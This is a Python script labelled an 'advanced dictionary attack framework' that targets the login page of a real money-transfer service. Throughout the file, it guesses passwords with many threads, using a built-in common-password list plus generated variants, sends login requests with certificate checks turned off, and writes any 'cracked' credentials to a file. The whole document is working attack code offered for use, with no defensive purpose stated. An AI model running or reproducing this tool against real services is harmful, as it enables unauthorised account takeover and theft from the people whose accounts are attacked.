#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ADVANCED DICTIONARY ATTACK FRAMEWORK
Target: https://wise.com/login
Author: Security Researcher
"""

import requests
import threading
import queue
import time
from colorama import Fore, Style, init

init(autoreset=True)

class AdvancedDictionaryAttack:
    def __init__(self, target_url, username):
        self.target = target_url
        self.username = username
        self.session = requests.Session()
        self.found_password = None
        self.attempts = 0
        self.lock = threading.Lock()
        
        # Common password lists
        self.common_passwords = [
            'admin', 'password', '123456', 'password123', 'admin123',
            '12345678', 'qwerty', '123456789', '12345', '1234',
            '111111', '1234567', 'dragon', '123123', 'baseball',
            'abc123', 'football', 'monkey', 'letmein', 'shadow',
            'master', '666666', 'qwertyuiop', '123321', 'mustang',
            '1234567890', 'michael', '654321', 'superman', '1qaz2wsx',
            '7777777', 'fuckyou', '121212', '000000', 'qazwsx',
            '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer',
            'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer',
            'harley', 'batman', 'andrew', 'tigger', 'sunshine',
            'iloveyou', '2000', 'charlie', 'robert', 'thomas',
            'hockey', 'ranger', 'daniel', 'starwars', 'klaster',
            '112233', 'george', 'computer', 'michelle', 'jessica',
            'pepper', '1111', 'zxcvbn', '555555', '11111111',
            '131313', 'freedom', '777777', 'pass', 'maggie',
            '159753', 'aaaaaa', 'ginger', 'princess', 'joshua',
            'cheese', 'amanda', 'summer', 'love', 'ashley',
            'nicole', 'chelsea', 'biteme', 'matthew', 'access',
            'yankees', '987654321', 'dallas', 'austin', 'thunder',
            'taylor', 'matrix', 'mobilemail', 'mom', 'monitor',
            'monitoring', 'montana', 'moon', 'moscow'
        ]
        
    def print_banner(self):
        """Display attack banner"""
        print(Fore.RED + r"""
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                               ║
    ║    ██████╗ ██╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗ █████╗ ██████╗ ██╗  ██╗║
    ║    ██╔══██╗██║██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔══██╗██╔══██╗██║ ██╔╝║
    ║    ██║  ██║██║██║        ██║   ██║██║   ██║██╔██╗ ██║███████║██████╔╝█████╔╝ ║
    ║    ██║  ██║██║██║        ██║   ██║██║   ██║██║╚██╗██║██╔══██║██╔══██╗██╔═██╗ ║
    ║    ██████╔╝██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║██║  ██║██║  ██║██║  ██╗║
    ║    ╚═════╝ ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝║
    ║                                                                               ║
    ║                     ADVANCED DICTIONARY ATTACK FRAMEWORK                      ║
    ║                          Target: https://wise.com/login                       ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def test_password(self, password):
        """Test a single password"""
        try:
            data = {
                'user': self.username,
                'pass': password.strip()
            }
            
            response = self.session.post(
                self.target,
                data=data,
                timeout=10,
                verify=False,
                allow_redirects=True
            )
            
            with self.lock:
                self.attempts += 1
                
                # Check for successful login indicators
                success_indicators = [
                    'Welcome', 'Dashboard', 'Logout', 'My Account',
                    'Profile', 'Admin', 'success', 'redirect',
                    'location.replace', 'window.location'
                ]
                
                for indicator in success_indicators:
                    if indicator in response.text:
                        self.found_password = password
                        print(f"\n{Fore.GREEN}[+] PASSWORD FOUND: {password}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Login successful! Response length: {len(response.text)}{Style.RESET_ALL}")
                        return True
                
                # Also check for failed login indicators
                failed_indicators = [
                    'Invalid', 'Wrong', 'Error', 'Failed',
                    'Incorrect', 'Try again', 'Not found'
                ]
                
                is_failed = any(indicator in response.text for indicator in failed_indicators)
                
                if self.attempts % 10 == 0:
                    print(f"{Fore.YELLOW}[*] Attempts: {self.attempts}, Testing: {password}{Style.RESET_ALL}")
                
                return False
                
        except Exception as e:
            with self.lock:
                print(f"{Fore.RED}[-] Error testing {password}: {e}{Style.RESET_ALL}")
            return False
    
    def worker(self, password_queue):
        """Worker thread for password testing"""
        while not password_queue.empty() and self.found_password is None:
            try:
                password = password_queue.get_nowait()
                if self.test_password(password):
                    break
                password_queue.task_done()
            except queue.Empty:
                break
    
    def load_custom_wordlist(self, filename):
        """Load custom password wordlist"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
                print(f"{Fore.CYAN}[*] Loaded {len(passwords)} passwords from {filename}{Style.RESET_ALL}")
                return passwords
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Wordlist {filename} not found. Using common passwords.{Style.RESET_ALL}")
            return self.common_passwords
    
    def generate_variations(self, base_passwords):
        """Generate password variations"""
        variations = []
        
        for password in base_passwords:
            # Add common suffixes
            suffixes = ['123', '1234', '12345', '123456', '!', '@', '#', '$', '%', '?', '2023', '2024']
            for suffix in suffixes:
                variations.append(password + suffix)
            
            # Capitalize first letter
            variations.append(password.capitalize())
            
            # Leet speak variations
            leet_replacements = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5'}
            leet_password = password
            for old, new in leet_replacements.items():
                leet_password = leet_password.replace(old, new).replace(old.upper(), new)
            variations.append(leet_password)
        
        return list(set(variations))  # Remove duplicates
    
    def run_attack(self, wordlist_file=None, threads=5):
        """Run dictionary attack"""
        self.print_banner()
        
        print(f"\n{Fore.CYAN}[*] Starting dictionary attack on: {self.target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Username: {self.username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Threads: {threads}{Style.RESET_ALL}")
        
        # Load passwords
        if wordlist_file:
            passwords = self.load_custom_wordlist(wordlist_file)
        else:
            passwords = self.common_passwords
            print(f"{Fore.CYAN}[*] Using {len(passwords)} common passwords{Style.RESET_ALL}")
        
        # Generate variations
        print(f"{Fore.CYAN}[*] Generating password variations...{Style.RESET_ALL}")
        all_passwords = self.generate_variations(passwords)
        print(f"{Fore.CYAN}[*] Total passwords to test: {len(all_passwords)}{Style.RESET_ALL}")
        
        # Create queue
        password_queue = queue.Queue()
        for password in all_passwords:
            password_queue.put(password)
        
        # Start threads
        start_time = time.time()
        thread_pool = []
        
        print(f"\n{Fore.YELLOW}[*] Starting attack at {time.strftime('%H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
        
        for i in range(threads):
            thread = threading.Thread(target=self.worker, args=(password_queue,))
            thread.daemon = True
            thread.start()
            thread_pool.append(thread)
        
        # Wait for completion
        try:
            while any(thread.is_alive() for thread in thread_pool) and self.found_password is None:
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Attack interrupted by user{Style.RESET_ALL}")
        
        # Calculate statistics
        end_time = time.time()
        duration = end_time - start_time
        rate = self.attempts / duration if duration > 0 else 0
        
        # Print results
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"║{'ATTACK SUMMARY':^78}║")
        print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}[*] Duration: {duration:.2f} seconds{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Attempts made: {self.attempts}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Rate: {rate:.2f} attempts/second{Style.RESET_ALL}")
        
        if self.found_password:
            print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"║{'SUCCESS! PASSWORD FOUND':^78}║")
            print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            print(f"\n{Fore.GREEN}[+] Username: {self.username}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Password: {self.found_password}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Credentials: {self.username}:{self.found_password}{Style.RESET_ALL}")
            
            # Save results
            with open('cracked_credentials.txt', 'w') as f:
                f.write(f"Target: {self.target}\n")
                f.write(f"Username: {self.username}\n")
                f.write(f"Password: {self.found_password}\n")
                f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            print(f"{Fore.GREEN}[+] Credentials saved to: cracked_credentials.txt{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[-] Password not found in dictionary{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Try a larger wordlist or different attack method{Style.RESET_ALL}")

# Main execution
if __name__ == "__main__":
    # Configuration
    TARGET_URL = "https://wise.com/login"
    USERNAME = "admin"  # Change based on your target
    WORDLIST_FILE = "passwords.txt"  # Optional custom wordlist
    THREADS = 10  # Number of concurrent threads
    
    # Run attack
    attacker = AdvancedDictionaryAttack(TARGET_URL, USERNAME)
    attacker.run_attack(wordlist_file=WORDLIST_FILE, threads=THREADS)